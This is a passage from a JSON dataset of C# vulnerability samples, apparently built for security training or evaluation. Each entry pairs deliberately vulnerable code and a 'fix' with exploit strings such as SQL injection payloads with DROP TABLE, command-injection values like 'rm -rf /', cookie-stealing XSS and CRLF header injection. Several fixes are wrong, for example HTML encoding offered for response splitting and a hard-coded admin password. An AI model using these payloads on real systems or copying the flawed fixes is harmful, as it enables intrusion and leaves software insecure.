        "vulnerability_code": "using System;\r\nusing System.Data.SqlClient;\r\nclass VulnerableApp {\r\n    public void ExecuteQuery(string userInput) {\r\n        string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\r\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\r\n            string query = \"SELECT * FROM Users WHERE Username='\" + userInput + \"'\";\r\n            SqlCommand command = new SqlCommand(query, connection);\r\n            SqlDataReader reader = command.ExecuteReader();\r\n            while (reader.Read()) {\r\n                Console.WriteLine(reader[0]);\r\n            }\r\n        }\r\n    }\r\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\r\nusing System.Data.SqlClient;\r\nclass SecureApp {\r\n    public void ExecuteQuery(string userInput) {\r\n        string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\r\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\r\n            string query = \"SELECT * FROM Users WHERE Username=@Username\";\r\n            SqlCommand command = new SqlCommand(query, connection);\r\n            command.Parameters.AddWithValue(\"@Username\", userInput);\r\n            SqlDataReader reader = command.ExecuteReader();\r\n            while (reader.Read()) {\r\n                Console.WriteLine(reader[0]);\r\n            }\r\n        }\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to bypass authentication.",
            "They can use SQL injection with a UNION SELECT statement to retrieve sensitive data from other tables.",
            "Input like \"'; DROP TABLE Users; --\" can be used to delete the Users table."
        ]
    },
    "c#_9": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "using System;\npublic class UserInputProcessor {\n    public void ProcessInput(string userInput) {\n        string command = \"echo \" + userInput;\n        System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + command);\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System;\npublic class UserInputProcessor {\n    public void ProcessInput(string userInput) {\n        string[] args = { \"/c\", \"echo\", userInput };\n        System.Diagnostics.Process.Start(\"cmd.exe\", args);\n    }\n}",
        "exploit_ways": [
            "User could input '& del /q *' to delete all files in the current directory.",
            "Could use '&& ipconfig > output.txt' to capture network configuration and save it to a file.",
            "Chain commands like '| whoami' to leak the identity of the running process."
        ]
    },
    "c#_10": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "using System.Web.Mvc;\n\npublic class AccountController : Controller\n{\n    [HttpPost]\n    public ActionResult Transfer(string targetAccount, decimal amount)\n    {\n        // Assume this method transfers money to another account.\n        if (amount > 0)\n        {\n            // Simulate a transfer operation\n            ViewBag.Message = \"Transfer successful!\";\n        }\n        return View();\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System.Web.Mvc;\n\npublic class AccountController : Controller\n{\n    [HttpPost]\n    [ValidateAntiForgeryToken]\n    public ActionResult Transfer(string targetAccount, decimal amount)\n    {\n        // Assume this method transfers money to another account.\n        if (amount > 0)\n        {\n            // Simulate a transfer operation\n            ViewBag.Message = \"Transfer successful!\";\n        }\n        return View();\n    }\n}",
        "exploit_ways": [
            "An attacker can trick the user into clicking on a malicious link that sends a POST request to perform unauthorized transfers.",
            "Using a CSRF token mechanism could be bypassed by social engineering, leading to unauthorized transactions.",
            "A crafted email with an embedded form that auto-submits upon opening can exploit this vulnerability to execute unwanted actions."
        ]
    },
    "c#_11": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System;\npublic class VulnerableClass {\n    public void UnsafeMethod(string input) {\n        char[] buffer = new char[10];\n        input.CopyTo(0, buffer, 0, input.Length);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\npublic class SecureClass {\n    public void SafeMethod(string input) {\n        if (input.Length > 10) {\n            throw new ArgumentException(\"Input is too long\");\n        }\n        char[] buffer = new char[10];\n        input.CopyTo(0, buffer, 0, input.Length);\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 10 characters to overwrite adjacent memory.",
            "This could lead to executing arbitrary code by overwriting the return address on the stack.",
            "By crafting the input carefully, an attacker might be able to manipulate program flow and gain unauthorized access."
        ]
    },
    "c#_12": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "using System;\nusing System.Web.UI;\n\npublic partial class Default : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            string userInput = Request.QueryString[\"data\"];\n            if (userInput != null)\n            {\n                LiteralControl ctrl = new LiteralControl();\n                ctrl.Text = $\"<div>{userInput}</div>\";\n                this.Controls.Add(ctrl);\n            }\n        }\n    }\n}",
        "cvss_score": 8.6,
        "fixed_code": "using System;\nusing System.Web.UI;\n\npublic partial class Default : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            string userInput = Request.QueryString[\"data\"];\n            if (userInput != null)\n            {\n                LiteralControl ctrl = new LiteralControl();\n                ctrl.Text = $\"<div>{Server.HtmlEncode(userInput)}</div>\";\n                this.Controls.Add(ctrl);\n            }\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can inject a script like '<script>alert(\\'XSS\\')</script>' to execute arbitrary JavaScript.",
            "They could use '<img src=x onerror=alert(document.cookie)>' to steal cookies or sensitive data.",
            "Exploiting with '<iframe src=https://attacker.com></iframe>' might load malicious content within the page."
        ]
    },
    "c#_13": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "using System;\npublic class UserInputHandler {\n    private void ExecuteCommand(string command) {\n        // Simulated method to execute a command\n        Console.WriteLine(\\\"Executing command: \\\" + command);\n    }\n    public void ProcessUserInput() {\n        Console.Write(\\\"Enter your command: \\\\n\\\");\n        string userInput = Console.ReadLine();\n        string sanitizedCommand = SanitizeInput(userInput);\n        ExecuteCommand(sanitizedCommand);\n    }\n    private string SanitizeInput(string input) {\n        // Incomplete and flawed sanitization attempt\n        if (input.Contains(\\\";\\\") || input.Contains(\\\"&\\\") || input.Contains(\\\"|\\\")) {\n            throw new ArgumentException(\\\"Invalid command!\\\");\n        }\n        return input;\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System;\npublic class UserInputHandler {\n    private void ExecuteCommand(string[] command) {\n        // Simulated method to execute a command\n        Console.WriteLine(\\\"Executing command: \\\" + string.Join(\\\" \\\", command));\n    }\n    public void ProcessUserInput() {\n        Console.Write(\\\"Enter your command: \\\\n\\\");\n        string userInput = Console.ReadLine();\n        if (userInput.Equals(\\\"whoami\\\") || userInput.Equals(\\\"ls\\\")) {\n            ExecuteCommand(new string[] { userInput });\n        } else {\n            Console.WriteLine(\\\"Not allowed\\\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'whoami && dir' to execute additional commands.",
            "Could potentially chain commands like 'ls; rm -rf /' if sanitization fails.",
            "Using a crafted payload like 'echo test > temp.txt' to create and write to files."
        ]
    },
    "c#_14": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "using System;\nusing System.Data.SqlClient;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string userInput) {\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\n            string query = \"SELECT * FROM Users WHERE Username=\" + userInput;\n            SqlCommand command = new SqlCommand(query, connection);\n            connection.Open();\n            SqlDataReader reader = command.ExecuteReader();\n            while (reader.Read()) {\n                Console.WriteLine(reader[0]);\n            }\n        }\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System;\nusing System.Data.SqlClient;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string userInput) {\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\n            string query = \"SELECT * FROM Users WHERE Username=@username\";\n            SqlCommand command = new SqlCommand(query, connection);\n            command.Parameters.AddWithValue(\"@username\", userInput);\n            connection.Open();\n            SqlDataReader reader = command.ExecuteReader();\n            while (reader.Read()) {\n                Console.WriteLine(reader[0]);\n            }\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
            "They can use '--' to comment out the rest of the query, potentially accessing unauthorized data or modifying tables.",
            "Input like '; DROP TABLE Users' can delete critical data."
        ]
    },
    "c#_15": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "using System;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string query) {\n        using (var connection = new System.Data.SqlClient.SqlConnection(connectionString)) {\n            var command = new System.Data.SqlClient.SqlCommand(query, connection);\n            connection.Open();\n            command.ExecuteNonQuery();\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string query, params object[] parameters) {\n        using (var connection = new System.Data.SqlClient.SqlConnection(connectionString)) {\n            var command = new System.Data.SqlClient.SqlCommand(query, connection);\n            for (int i = 0; i < parameters.Length; i++)\n                command.Parameters.AddWithValue(\"@p\" + i, parameters[i]);\n            connection.Open();\n            command.ExecuteNonQuery();\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input a malicious query like 'SELECT * FROM Users WHERE Username = '' OR 1=1' to retrieve all user data.",
            "By using a crafted SQL payload, an attacker can drop tables or perform other destructive operations on the database.",
            "The vulnerability allows for blind SQL injection where attackers can extract information by observing application behavior in response to input."
        ]
    },
    "c#_16": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "using System;\nusing System.Web.Mvc;\n\nnamespace VulnerableApp.Controllers {\n    public class AccountController : Controller {\n        [HttpPost]\n        public ActionResult Transfer(string recipient, decimal amount) {\n            // Simulate transferring funds to another account without CSRF protection\n            ViewBag.Message = $\"Transferred ${amount} to {recipient}\";\n            return View();\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.Web.Mvc;\n\nnamespace SecureApp.Controllers {\n    public class AccountController : Controller {\n        [HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Transfer(string recipient, decimal amount) {\n            // Simulate transferring funds to another account with CSRF protection\n            ViewBag.Message = $\"Transferred ${amount} to {recipient}\";\n            return View();\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious web page that triggers a transfer to their account when the victim visits it while logged into the vulnerable site.",
            "Attackers can use phishing emails containing links or embedded images pointing to crafted URLs that perform unauthorized actions on behalf of authenticated users.",
            "By embedding a hidden form in a webpage and using JavaScript to submit it automatically, attackers can initiate transfers without user interaction."
        ]
    },
    "c#_17": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "using System.Web.Mvc;\n\npublic class UserController : Controller\n{\n    public ActionResult ChangeEmail(string newEmail)\n    {\n        // Vulnerable to CSRF as there is no anti-forgery token\n        // Update user's email without verifying the request origin\n        var userId = Session[\"UserId\"];\n        UpdateUserEmail(userId, newEmail);\n        return RedirectToAction(\"Profile\");\n    }\n\n    private void UpdateUserEmail(object userId, string newEmail)\n    {\n        // Database update logic here\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System.Web.Mvc;\n\npublic class UserController : Controller\n{\n    [ValidateAntiForgeryToken]\n    public ActionResult ChangeEmail(string newEmail)\n    {\n        var userId = Session[\"UserId\"];\n        UpdateUserEmail(userId, newEmail);\n        return RedirectToAction(\"Profile\");\n    }\n\n    private void UpdateUserEmail(object userId, string newEmail)\n    {\n        // Database update logic here\n    }\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link to change their email.",
            "A crafted HTML form with a hidden CSRF token from another site can be used to perform actions without the user's knowledge.",
            "Using JavaScript, an attacker could programmatically submit a request to change the user's details."
        ]
    },
    "c#_18": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "public string GetUserDetails(string userId) {\n    string query = \"SELECT * FROM Users WHERE id = \" + userId;\n    return ExecuteQuery(query);\n}",
        "cvss_score": 7.5,
        "fixed_code": "public string GetUserDetails(string userId) {\n    using (var command = new SqlCommand()) {\n        command.CommandText = \"SELECT * FROM Users WHERE id = @userId\";\n        command.Parameters.AddWithValue(\"@userId\", userId);\n        return ExecuteQuery(command);\n    }\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user details.",
            "They can use '1; DROP TABLE Users' to delete the Users table.",
            "Input like '1 UNION SELECT username, password FROM admin_table' can extract admin credentials."
        ]
    },
    "c#_19": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "using System;\r\nusing System.IO;\r\nusing System.Runtime.Serialization.Formatters.Binary;\r\nclass Program {\r\n    static void Main(string[] args) {\r\n        BinaryFormatter formatter = new BinaryFormatter();\r\n        using (FileStream stream = new FileStream(\"data.bin\", FileMode.Open)) {\r\n            object obj = formatter.Deserialize(stream);\r\n        }\r\n    }\r\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\r\nusing System.IO;\r\nusing Newtonsoft.Json;\r\nclass Program {\r\n    static void Main(string[] args) {\r\n        string jsonData = File.ReadAllText(\"data.bin\");\r\n        object obj = JsonConvert.DeserializeObject(jsonData);\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker could craft a malicious binary file that, when deserialized, executes arbitrary code.",
            "By manipulating the serialized data, an attacker can exploit type confusion vulnerabilities to perform unauthorized actions.",
            "A crafted payload could lead to denial-of-service conditions by causing excessive resource consumption during deserialization."
        ]
    },
    "c#_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "using System.Security.Principal;\nclass VulnerableClass {\n    public void RunAsAdmin() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            // Vulnerable: No proper validation or logging\n            System.Diagnostics.Process.Start(\"cmd.exe\", \"/c net user admin password /add && net localgroup administrators admin /add\");\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System.Security.Principal;\nclass SecureClass {\n    public void RunAsAdmin() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            // Secure: Log action and validate necessity\n            System.Diagnostics.EventLog.WriteEntry(\"User \" + identity.Name + \" attempted to run administrative commands.\", System.Diagnostics.EventLogEntryType.Information);\n            if (IsActionNecessary()) {\n                System.Diagnostics.Process.Start(\"cmd.exe\", \"/c net user admin securepassword123 /add && net localgroup administrators admin /add\");\n            }\n        } else {\n            throw new UnauthorizedAccessException();\n        }\n    }\n\n    private bool IsActionNecessary() {\n        // Implement necessary checks here\n        return true;\n    }\n}",
        "exploit_ways": [
            "An attacker with admin privileges can execute arbitrary commands via the vulnerable method to add users or modify groups.",
            "The vulnerability allows for potential persistence by adding a backdoor user to the system administrators group.",
            "Exploiting this could lead to unauthorized administrative access, enabling further attacks like data exfiltration or ransomware deployment."
        ]
    },
    "c#_21": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "using System;\r\nusing System.IO;\r\nusing System.Runtime.Serialization.Formatters.Binary;\r\nclass Program\r\n{\r\n    static void Main(string[] args)\r\n    {\r\n        Console.WriteLine(\"Enter serialized data:\");\r\n        string input = Console.ReadLine();\r\n        BinaryFormatter formatter = new BinaryFormatter();\r\n        using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(input)))\r\n        {\r\n            object obj = formatter.Deserialize(ms);\r\n        }\r\n    }\r\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\r\nusing System.IO;\r\nusing Newtonsoft.Json;\r\nclass Program\r\n{\r\n    static void Main(string[] args)\r\n    {\r\n        Console.WriteLine(\"Enter serialized data:\");\r\n        string input = Console.ReadLine();\r\n        try\r\n        {\r\n            object obj = JsonConvert.DeserializeObject(input);\r\n        }\r\n        catch (JsonException ex)\r\n        {\r\n            Console.WriteLine(\"Deserialization failed: \" + ex.Message);\r\n        }\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker can craft a malicious payload to execute arbitrary code upon deserialization.",
            "They can use the payload to perform remote code execution, leading to system compromise.",
            "By injecting crafted serialized data, an attacker might escalate privileges or access sensitive information."
        ]
    },
    "c#_22": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System; class Program { unsafe static void Main(string[] args) { char* buffer = stackalloc char[16]; Console.WriteLine(\"Enter a string:\"); string input = Console.ReadLine(); for (int i = 0; i < input.Length; i++) { buffer[i] = input[i]; } Console.WriteLine(buffer); } }",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nclass Program\n{\n    static void Main(string[] args)\n    {\n        char[] buffer = new char[16];\n        Console.WriteLine(\"Enter a string:\");\n        string input = Console.ReadLine();\n        int lengthToCopy = Math.Min(input.Length, 16);\n        input.CopyTo(0, buffer, 0, lengthToCopy);\n        Console.WriteLine(new string(buffer));\n    }\n}",
        "exploit_ways": [
            "An attacker can enter a string longer than 16 characters to overwrite adjacent memory, potentially changing program execution flow.",
            "Overwriting the return address on the stack with malicious code can lead to arbitrary code execution.",
            "By carefully crafting input, an attacker may be able to corrupt other variables or data structures located in adjacent memory space."
        ]
    },
    "c#_23": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "public void TransferFunds(string targetAccount, decimal amount) {\\n    if (Session[\"authenticated\"] != null && (bool)Session[\"authenticated\"]) {\\n        // Simulate fund transfer logic\\n        AccountService.Transfer(targetAccount, amount);\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "public void TransferFunds(string targetAccount, decimal amount, string antiForgeryToken) {\\n    if (Session[\"authenticated\"] != null && (bool)Session[\"authenticated\"]) {\\n        if (Request.Form[\"__RequestVerificationToken\"] == antiForgeryToken) {\\n            // Simulate fund transfer logic\\n            AccountService.Transfer(targetAccount, amount);\\n        } else {\\n            throw new InvalidOperationException(\"Invalid anti-forgery token.\");\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that, when visited by an authenticated user, transfers funds from their account to the attacker's account.",
            "By embedding a CSRF attack in a forum post or email, an attacker can trick users into executing unauthorized actions on the application without their knowledge.",
            "Using social engineering techniques, an attacker can lure users to a malicious website that automatically submits a form to the vulnerable endpoint, exploiting the lack of protection against CSRF."
        ]
    },
    "c#_24": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "using System;\nusing System.IO;\npublic class FileManager {\n    private string basePath = @\"C:\\secure\\uploads\";\n    public void ReadFile(string fileName) {\n        try {\n            string fullPath = Path.Combine(basePath, fileName);\n            if (fullPath.StartsWith(basePath)) {\n                using (StreamReader reader = new StreamReader(fullPath)) {\n                    Console.WriteLine(reader.ReadToEnd());\n                }\n            } else {\n                throw new Exception(\"Access Denied\");\n            }\n        } catch (Exception ex) {\n            Console.WriteLine(ex.Message);\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.IO;\npublic class FileManager {\n    private string basePath = @\"C:\\secure\\uploads\";\n    public void ReadFile(string fileName) {\n        try {\n            if (Path.GetFileName(fileName) != fileName || !Directory.Exists(basePath)) {\n                throw new Exception(\"Invalid file name\");\n            }\n            string fullPath = Path.Combine(basePath, fileName);\n            using (StreamReader reader = new StreamReader(fullPath)) {\n                Console.WriteLine(reader.ReadToEnd());\n            }\n        } catch (Exception ex) {\n            Console.WriteLine(ex.Message);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could input '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' to access the hosts file.",
            "They can specify a full path like 'C:\\Windows\\win.ini' to read system files.",
            "Using crafted paths with null bytes or other special characters might bypass checks in some environments."
        ]
    },
    "c#_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\r\n{\r\n    if (env.IsDevelopment())\r\n    {\r\n        app.UseDeveloperExceptionPage();\r\n    }\r\n\r\n    app.UseRouting();\r\n\r\n    app.UseEndpoints(endpoints =>\r\n    {\r\n        endpoints.MapControllers();\r\n    });\r\n}",
        "cvss_score": 2.6,
        "fixed_code": "public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\r\n{\r\n    if (env.IsDevelopment())\r\n    {\r\n        app.UseDeveloperExceptionPage();\r\n    }\r\n\r\n    app.UseHsts();\r\n    app.UseHttpsRedirection();\r\n    app.UseSecurityHeaders(new SecurityHeadersPolicy\r\n    {\r\n        ContentSecurityPolicy = \"default-src 'self';\",\r\n        XContentTypeOptions = \"nosniff\",\r\n        XXssProtection = \"1; mode=block\",\r\n        ReferrerPolicy = \"no-referrer\",\r\n        StrictTransportSecurity = \"max-age=31536000\"\r\n    });\r\n\r\n    app.UseRouting();\r\n\r\n    app.UseEndpoints(endpoints =>\r\n    {\r\n        endpoints.MapControllers();\r\n    });\r\n}",
        "exploit_ways": [
            "An attacker can perform a clickjacking attack due to the absence of X-Frame-Options or Content-Security-Policy headers.",
            "The application is vulnerable to cross-site scripting (XSS) attacks because there are no appropriate security headers like X-XSS-Protection.",
            "Without HSTS, an attacker could intercept traffic if the user visits the site over HTTP."
        ]
    },
    "c#_26": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class ResponseSplitter {\n    public void GenerateResponse(string userInput) {\n        HttpResponse response = HttpContext.Current.Response;\n        response.Write(\"<h1>Welcome, \" + userInput + \"!</h1>\");\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class ResponseSplitter {\n    public void GenerateResponse(string userInput) {\n        HttpResponse response = HttpContext.Current.Response;\n        string safeInput = HttpUtility.HtmlEncode(userInput);\n        response.Write(\"<h1>Welcome, \" + safeInput + \"!</h1>\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'User\\r\\nSet-Cookie: admin=true;' to set a cookie on the victim's browser.",
            "They can use 'User\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Attacker Content</h1>' to inject arbitrary HTML content into the response.",
            "Input like 'User\\r\\nLocation: http://malicious.com' can redirect users to a malicious site."
        ]
    },
    "c#_27": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "using System;\nclass InfiniteLoopVulnerability {\n    public void Run() {\n        while (true) {\n            Console.WriteLine(\"Running...\");\n        }\n    }\n}",
        "cvss_score": 3.7,
        "fixed_code": "using System;\nclass SafeLoop {\n    public void Run() {\n        int count = 0;\n        while (count < 100) { // Limit the number of iterations\n            Console.WriteLine(\"Running...\");\n            count++;\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can trigger the Run method, causing the application to hang indefinitely.",
            "This can exhaust system resources by running multiple instances concurrently.",
            "The infinite loop can prevent other processes or threads from executing properly."
        ]
    },
    "c#_28": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\nusing System.Net;\nclass Program {\n    static void Main(string[] args) {\n        string userInput = Console.ReadLine();\n        WebHeaderCollection headers = new WebHeaderCollection();\n        headers[\"Set-Cookie\"] = \"user=\" + userInput + \"; path=/\";\n        HttpListener listener = new HttpListener();\n        listener.Prefixes.Add(\"http://localhost:8080/\");\n        listener.Start();\n        while (true) {\n            HttpListenerContext context = listener.GetContext();\n            HttpListenerRequest request = context.Request;\n            HttpListenerResponse response = context.Response;\n            response.Headers.Add(headers);\n            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(request.RawUrl);\n            response.OutputStream.Write(buffer, 0, buffer.Length);\n            response.Close();\n        }\n    }\n}",
        "cvss_score": 6.1,
        "fixed_code": "using System;\nusing System.Net;\nclass Program {\n    static void Main(string[] args) {\n        string userInput = Console.ReadLine().Replace(\"\\r\", \"\").Replace(\"\\n\", \"\");\n        WebHeaderCollection headers = new WebHeaderCollection();\n        headers[\"Set-Cookie\"] = \"user=\" + userInput + \"; path=/\";\n        HttpListener listener = new HttpListener();\n        listener.Prefixes.Add(\"http://localhost:8080/\");\n        listener.Start();\n        while (true) {\n            HttpListenerContext context = listener.GetContext();\n            HttpListenerRequest request = context.Request;\n            HttpListenerResponse response = context.Response;\n            response.Headers.Add(headers);\n            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(request.RawUrl);\n            response.OutputStream.Write(buffer, 0, buffer.Length);\n            response.Close();\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'user\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hacked</body></html>' to inject a fake response.",
            "They can add 'user\\r\\nLocation: http://malicious.com' to redirect users to a malicious site.",
            "Input like 'user\\r\\nContent-Type: text/plain' can change the content type of the response."
        ]
    },
    "c#_29": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main() {\n        Console.WriteLine(\"Enter file path:\");\n        string filePath = Console.ReadLine();\n        if (File.Exists(filePath)) {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(content);\n        } else {\n            Console.WriteLine(\"File not found.\");\n        }\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main() {\n        Console.WriteLine(\"Enter file path:\");\n        string filePath = Console.ReadLine();\n        string[] allowedPaths = { \"allowed_file1.txt\", \"allowed_file2.txt\" };\n        if (Array.Exists(allowedPaths, element => element == filePath) && File.Exists(filePath)) {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(content);\n        } else {\n            Console.WriteLine(\"File not found or access denied.\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input a path to sensitive files like \"/etc/passwd\".",
            "They could use relative paths to access other files in the same directory, e.g., \"../secret.txt\".",
            "By entering a crafted path, they might be able to exploit additional vulnerabilities if the program processes file contents insecurely."
        ]
    },
    "c#_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "using System;\npublic class SessionManager {\n    private string sessionId;\n\n    public void SetSessionId(string id) {\n        this.sessionId = id;\n    }\n\n    public string GetSessionId() {\n        return this.sessionId;\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System;\npublic class SessionManager {\n    private string sessionId;\n\n    public void SetSessionId(string id) {\n        if (string.IsNullOrEmpty(id))\n            throw new ArgumentException(\"Invalid session ID\");\n        this.sessionId = GenerateSecureSessionId();\n    }\n\n    private string GenerateSecureSessionId() {\n        return Convert.ToBase64String(System.Security.Cryptography.RandomNumberGenerator.GetBytes(32));\n    }\n\n    public string GetSessionId() {\n        return this.sessionId;\n    }\n}",
        "exploit_ways": [
            "An attacker could predict or set the session ID to gain unauthorized access.",
            "By fixing the session ID, an attacker can maintain control over a user's session without authentication.",
            "The attacker might use the fixed session ID to hijack sessions on systems that do not regenerate session IDs after login."
        ]
    },
    "c#_31": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System; using System.Web; public class HttpResponseSplitter { public void SendResponse(HttpContext context) { string userInput = context.Request.QueryString[\"userInput\"]; context.Response.Write(\"<h1>Welcome, \" + userInput + \"!</h1>\"); } }",
        "cvss_score": 7.5,
        "fixed_code": "using System; using System.Web; public class HttpResponseSplitter { public void SendResponse(HttpContext context) { string userInput = context.Request.QueryString[\"userInput\"]; context.Response.Write(\"<h1>Welcome, \" + HttpUtility.HtmlEncode(userInput) + \"!</h1>\"); } }",
        "exploit_ways": [
            "An attacker can input 'name%0d%0aSet-Cookie:maliciousCookie=true' to inject malicious cookies.",
            "They can use 'name%0d%0aContent-Length:123456789' to cause the server to send an incorrect content length, disrupting further responses.",
            "Input like 'name%0d%0aHTTP/1.1%20200%20OK' can be used to inject a new HTTP response."
        ]
    },
    "c#_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "using System;\r\nusing System.Threading;\r\nclass Program\r\n{\r\n    private static int sharedResource = 0;\r\n\r\n    static void Main()\r\n    {\r\n        Thread thread1 = new Thread(IncrementSharedResource);\r\n        Thread thread2 = new Thread(IncrementSharedResource);\r\n\r\n        thread1.Start();\r\n        thread2.Start();\r\n\r\n        thread1.Join();\r\n        thread2.Join();\r\n\r\n        Console.WriteLine(\"Final value of shared resource: \" + sharedResource);\r\n    }\r\n\r\n    static void IncrementSharedResource()\r\n    {\r\n        for (int i = 0; i < 10000; i++)\r\n        {\r\n            int temp = sharedResource;\r\n            Thread.Sleep(0); // Simulate some work\r\n            sharedResource = temp + 1;\r\n        }\r\n    }\r\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\r\nusing System.Threading;\r\nclass Program\r\n{\r\n    private static int sharedResource = 0;\r\n    private static readonly object lockObject = new object();\r\n\r\n    static void Main()\r\n    {\r\n        Thread thread1 = new Thread(IncrementSharedResource);\r\n        Thread thread2 = new Thread(IncrementSharedResource);\r\n\r\n        thread1.Start();\r\n        thread2.Start();\r\n\r\n        thread1.Join();\r\n        thread2.Join();\r\n\r\n        Console.WriteLine(\"Final value of shared resource: \" + sharedResource);\r\n    }\r\n\r\n    static void IncrementSharedResource()\r\n    {\r\n        for (int i = 0; i < 10000; i++)\r\n        {\r\n            lock(lockObject)\r\n            {\r\n                int temp = sharedResource;\r\n                Thread.Sleep(0); // Simulate some work\r\n                sharedResource = temp + 1;\r\n            }\r\n        }\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker could manipulate thread timing to cause inconsistent or incorrect values in the shared resource.",
            "By repeatedly running the program, they might observe that the final value of the shared resource is not consistently 20000 due to race conditions.",
